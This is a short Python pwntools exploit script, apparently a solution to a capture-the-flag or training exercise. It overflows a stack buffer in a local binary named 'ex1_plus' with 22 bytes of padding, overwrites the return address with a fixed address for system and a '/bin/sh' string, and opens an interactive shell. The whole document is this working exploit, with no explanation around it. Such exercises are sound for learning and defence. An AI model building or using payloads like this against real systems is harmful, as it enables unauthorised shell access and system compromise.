from pwn import *

sys_addr = 0x08049060
binsh_addr = 0x0804a019

payload = b"A" * (18 + 4) + p32(sys_addr) + b"A" * 4 + p32(binsh_addr)

p = process("./ex1_plus")
p.send(payload)
p.interactive()
